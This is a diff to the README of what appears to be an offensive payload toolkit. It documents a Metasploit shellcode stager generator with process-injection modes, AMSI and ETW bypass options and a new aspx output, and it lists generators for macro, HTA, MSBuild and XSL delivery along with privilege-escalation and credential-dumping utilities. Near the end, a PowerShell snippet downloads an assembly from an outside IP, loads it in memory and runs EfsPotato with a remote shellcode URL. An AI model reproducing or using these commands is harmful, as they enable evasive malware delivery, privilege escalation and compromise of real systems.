@@ -4,24 +4,43 @@
 * By default, staged payloads will pull from the following URL `http://(LHOST)/sc`.
 * Stageless payloads will automatically apply an XOR encryption to obfuscate the shellcode.
 
+## All Tools
+
+```
+generate_msf_linux_exe.py
+generate_tool_loader.py
+generate_win_hta.py
+generate_win_installutil_ps_runner.py
+generate_win_js.py
+generate_win_msbuild_runner.py
+generate_win_msf_pe_loader.py
+generate_win_msf_stager.py                  # Create stager for MSF shellcode
+generate_win_util_EfsPotato.py              # Compile EfsPotato Local PrivEsc Utility
+generate_win_util_MiniDump.py               # Compile MiniDump Tool
+generate_win_util_PowerupSQLScript.py       # Generate PowerupSQL automation script
+generate_win_util_PrintSpooferNet.py
+generate_win_util_PSLessExec.py
+generate_win_util_SQLAssembly.py
+generate_win_util_SQLClient.py
+generate_winword_macro.py
+generate_win_xsl.py
+
+```
+
 ## MSF Stager
 
 ```
-usage: generate_win_msf_stager.py [-h]
-                                  [--injection {hollow,interprocess,earlybird,standard}]
-                                  [--format {exe,dll}]
-                                  [--heuristics | --no-heuristics]
-                                  [--amsi | --no-amsi] [--etw | --no-etw]
-                                  [--stageless | --no-stageless]
+usage: generate_win_msf_stager.py [-h] [--injection {hollow,interprocess,earlybird,standard}] [--format {exe,dll,aspx}] [--heuristics] [--amsi] [--etw] [--stageless] [--output OUTPUT]
 
 optional arguments:
   -h, --help            show this help message and exit
   --injection {hollow,interprocess,earlybird,standard}, -i {hollow,interprocess,earlybird,standard}
-  --format {exe,dll}, -f {exe,dll}
-  --heuristics, --no-heuristics
-  --amsi, --no-amsi
-  --etw, --no-etw
-  --stageless, --no-stageless
+  --format {exe,dll,aspx}, -f {exe,dll,aspx}
+  --heuristics
+  --amsi
+  --etw
+  --stageless
+  --output OUTPUT, -o OUTPUT
 ```
 
 ### Examples
@@ -32,6 +51,9 @@ python3 generate_win_msf_stager.py --injection hollow --format dll
 
 # Create a stageless exe that will load and run shellcode within the same process
 python3 generate_win_msf_stager.py --stageless --format exe
+
+# Create a stageless aspx
+python3 generate_win_msf_stager.py --stageless --format aspx
 ```
 
 ## Generate Tool Loading Commands
@@ -84,3 +106,4 @@ $b=(New-object system.net.webclient).DownloadData($u)
 $a=[System.Reflection.Assembly]::Load($b)
 [EfsPotato.Program]::Main("http://10.10.14.110/shellcode")
 ```
+
